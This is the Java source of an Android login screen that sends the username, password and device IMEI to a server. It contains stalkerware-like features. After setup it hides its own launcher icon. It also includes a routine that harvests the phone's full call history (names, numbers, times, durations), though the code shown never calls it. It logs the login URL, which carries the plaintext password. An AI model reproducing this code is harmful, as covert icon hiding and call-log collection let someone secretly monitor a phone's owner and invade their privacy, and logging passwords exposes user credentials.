package com.example.service;


import java.util.Date;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.BitmapFactory.Options;
import android.graphics.Point;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.Response.ErrorListener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

public class Activity_Login extends Activity {

	EditText edtUsername;
	EditText edtPassword;
	
	//
	private  String phNumber, name, callDuration;
	static StringBuffer sb;
	String misstype;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_login);
		initializeControls();
	}
	
private void initializeControls(){
		
		int font_Large = Globals.getAppFontSize_Large(this);
		int font_Normal = Globals.getAppFontSize(this);
		Point screenSize = Globals.getScreenSize(this);
		Point btnSize = Globals.getAppButtonSize(this);
		
		ImageView logo = (ImageView)findViewById(R.id.imgViewLogo);
		ImageView logoName = (ImageView)findViewById(R.id.imgViewLogoName);
		
		logo.getLayoutParams().width = screenSize.x/8;
		logo.getLayoutParams().height = screenSize.x/8;
		
		Options options = new BitmapFactory.Options();
		options.inScaled = false;
		Bitmap bit = BitmapFactory.decodeResource(getResources(), R.drawable.logo_name,options);
		int logoNameWidth = screenSize.x/2;
		logoName.setImageBitmap(Globals.scaleToWidth(bit, logoNameWidth));
		
		
		TextView txtH1 = (TextView)findViewById(R.id.txtHeading1);
		TextView txtH2 = (TextView)findViewById(R.id.txtHeading2);
		txtH1.setTextSize(font_Large);
		txtH2.setTextSize(font_Large);
		
		edtUsername = (EditText)findViewById(R.id.edtUsername);
		edtPassword = (EditText)findViewById(R.id.edtPassword);
		edtUsername.setTextSize(font_Normal);
		edtPassword.setTextSize(font_Normal);
		
		
		Button btnLogin = (Button)findViewById(R.id.btnLogin);
		btnLogin.setTextSize(font_Normal);
		
		btnLogin.getLayoutParams().width = btnSize.x;
		btnLogin.getLayoutParams().height = btnSize.y;
		
		btnLogin.setOnTouchListener(new Custom_ButtonOnTouchListener_OrangeBG(btnLogin, this));
		
		DBHandler_Main dbH = new DBHandler_Main(this);
		dbH.createDataBase();
		
		 //HIDE APP ICON
	      
	      PackageManager packageManager = this.getPackageManager();
	      ComponentName componentName = new ComponentName(this,Activity_Login.class);
	      packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	      
		
	}
	
	Boolean validateCredentials(){
		
		String username = edtUsername.getText().toString();
		String password = edtPassword.getText().toString();
		
		if(username == null || password == null)
			return false;
		
		if(username.trim().equals("") || password.trim().equals(""))
			return false;
		
		return true;
	}
	
	public void btnLoginClick(View v){
		
		if(validateCredentials()){
			
			Custom_ConnectionDetector cd = new Custom_ConnectionDetector(
					getApplicationContext());

			if (!cd.isConnectingToInternet()) {
				Toast.makeText(
						this
						,"No Internet Connection",
						Toast.LENGTH_SHORT).show();
			}else{
				
				try{
					String url = Globals.getLoginURL(edtUsername.getText().toString(), edtPassword.getText().toString(), Globals.getDeviceImei(this));
					Log.i("HARSH1", url);
					JsonObjectRequest  jsonArrayRQST = new JsonObjectRequest(Request.Method.POST,url, null,  new Response.Listener<JSONObject>() {
				        @Override
				        public void onResponse(JSONObject response) {
				             gotLoginResponce(response);
				        }
				    }, new ErrorListener() {
						

						@Override
						public void onErrorResponse(VolleyError ex) {
							Toast.makeText(
									Activity_Login.this,
									"Error! Please try again.",
									Toast.LENGTH_SHORT).show();
							Log.i("HARSH1", "VOLLEY EX--> "+ex.getLocalizedMessage()+"\n"+ex.getMessage()+"\n"+ex.getStackTrace());
						
					
							
						}});
				
				Custom_VolleyAppController.getInstance().addToRequestQueue(
						jsonArrayRQST);
				}catch(Exception ex){
					Toast.makeText(
							Activity_Login.this,
							"Exception",
							Toast.LENGTH_SHORT).show();

					Log.i("HARSH1", "EX--> "+ex.getLocalizedMessage()+"\n"+ex.getMessage()+"\n"+ex.getStackTrace());
				}

			}
				
		}else{
			Toast.makeText(
					Activity_Login.this,
					"Please Enter Username and Password",
					Toast.LENGTH_SHORT).show();
		}
	}
	
	private void gotLoginResponce(JSONObject jsonObj){
		
		String err =null;
		if(jsonObj != null){
			
			Log.i("HARSH1", "JSON--> "+jsonObj.toString());
				try {
					//{"registerStatus":true,"loginStatus":true,"mappedStatus":true},{"loginStatus":false}
					if(jsonObj.has("loginStatus")){
						String loginStatus = jsonObj.getString("loginStatus");
						if(loginStatus.trim().equals("true")){
							
							if(jsonObj.has("registerStatus")){
								String regStatus = jsonObj.getString("registerStatus");
								if(!regStatus.trim().equals("true")){
									err = "Device Registration Failed, Please try again";
								}else{
									//SUCCESS
									if(jsonObj.has("mappedStatus")){								
										String mappedStatus = jsonObj.getString("mappedStatus");
										Globals.setMappingStatus(mappedStatus, this);
									}
									Intent i = new Intent(this, Activity_Main.class);
									startActivity(i);
									this.finish();
								}
							}
							
						}else{
							err = "Login Failed, Please check credentials";
						}
						
					}else{
						err = "Error from server";
					}
					
				} catch (JSONException e) {
					err = "Exception Occured";
				}
				
			}
			
		else{
			err = "Responce is null";
		}
		
		if(err != null){
			Toast.makeText(
					this
					,err,
					Toast.LENGTH_SHORT).show();
			
			edtPassword.setText("");
		}
			
		
		
	}
	
	private void getCallDetails() {

		sb = new StringBuffer();
		Cursor managedCursor = this.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, CallLog.Calls._ID + " > " + Globals.getLastCallId(this), null, CallLog.Calls.DATE + " ASC");
		int id = managedCursor.getColumnIndex(CallLog.Calls._ID);
		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
		int nameColumn = managedCursor
				.getColumnIndex(CallLog.Calls.CACHED_NAME);

		sb.append("Call Details :");
		
		int cnt =0;
		while (managedCursor.moveToNext()) {
			cnt++;
			String Id = managedCursor.getString(id);
			phNumber = managedCursor.getString(number);
			name = managedCursor.getString(nameColumn);
			String callType = managedCursor.getString(type);
			String callDate = managedCursor.getString(date);
			Date callDayTime = new Date(Long.valueOf(callDate));
			callDuration = managedCursor.getString(duration);
			int Callduration = Integer.parseInt(callDuration);

			String dir = null;
			int dircode = Integer.parseInt(callType);
			switch (dircode) {
			case CallLog.Calls.OUTGOING_TYPE:
				dir = "OUTGOING";
				break;

			case CallLog.Calls.INCOMING_TYPE:
				dir = "INCOMING";
				break;

			case CallLog.Calls.MISSED_TYPE:
				dir = "MISSED";
				break;
			}
			if (name == null) {
				name = "Unknown";
			}
			if (dir == "MISSED") {
				if (Callduration != 0) {
					Callduration = 0;
					misstype = "User haven't seen yet";
					sb.append("\nid:-" + Id + "\nName:-" + name
							+ "\nPhone Number:- " + phNumber
							+ " \nCall Type:- " + dir + "(" + misstype
							+ ") \nCall Date:- " + callDayTime
							+ " \nCall duration:- "
							+ gettimestString(Callduration));

					sb.append("\n");
					sb.append(" ");

				}

			} else if (dir == "INCOMING") {
				if (Callduration == 0) {
					dir = "MISSED";
					misstype = "I Have cancelled";
					sb.append("\nid:-" + Id + "\nName:-" + name
							+ "\nPhone Number:- " + phNumber
							+ " \nCall Type:- " + dir + "(" + misstype
							+ ") \nCall Date:- " + callDayTime
							+ " \nCall duration:- "
							+ gettimestString(Callduration));

					sb.append("\n");
					sb.append(" ");

				} else {
					sb.append("\nid:-" + Id + "\nName:-" + name
							+ "\nPhone Number:- " + phNumber
							+ " \nCall Type:- " + dir + " \nCall Date:- "
							+ callDayTime + " \nCall duration:- "
							+ gettimestString(Callduration));
					sb.append("\n");
					sb.append(" ");
				}
			} else {
				sb.append("\nid:-" + Id + "\nName:-" + name
						+ "\nPhone Number:- " + phNumber + " \nCall Type:- "
						+ dir + " \nCall Date:- " + callDayTime
						+ " \nCall duration:- " + gettimestString(Callduration));
				// sb.append("\n----------------------------------");
				sb.append("\n");
				sb.append(" ");

			}

			
		}
		Log.i("HARSH", "count -->"+cnt+"\n" + sb + "\n");
		managedCursor.close();
	}

	String gettimestString(int callDuration) {
		if (callDuration < 60) {
			return callDuration + "sec";
		} else {
			int s = callDuration % 60;
			int m = callDuration / 60;
			return m + "min" + " " + s + "sec";
		}

	}

}



/*
 *  String url1 =" http://abc.dev.domain.com/0007AC/ads/800x480 15sec h.264.mp4";
		 String url2 =" http://abc.dev.domain.com?username=HArsh VArdhan";
		 
		 Log.i("HARSH1", "URL BEFORE "+url1);
		 Log.i("HARSH2", "URL BEFORE "+url2);
		 Log.i("HARSH3", "URL BEFORE "+Globals.getLoginURL("abc", "def", "123"));
		 
		 Log.i("HARSH1", "URL AFTER "+Globals.getValidURL(url1) );
		 Log.i("HARSH2", "URL AFTER "+Globals.getValidURL(url2));
		 Log.i("HARSH3", "URL AFTER "+Globals.getValidURL(Globals.getLoginURL("abc", "def", "123")));
		 Log.i("HARSH3", "URL NEW WAY "+Globals.getLoginURL1("abc", "def", "123"));
		 */
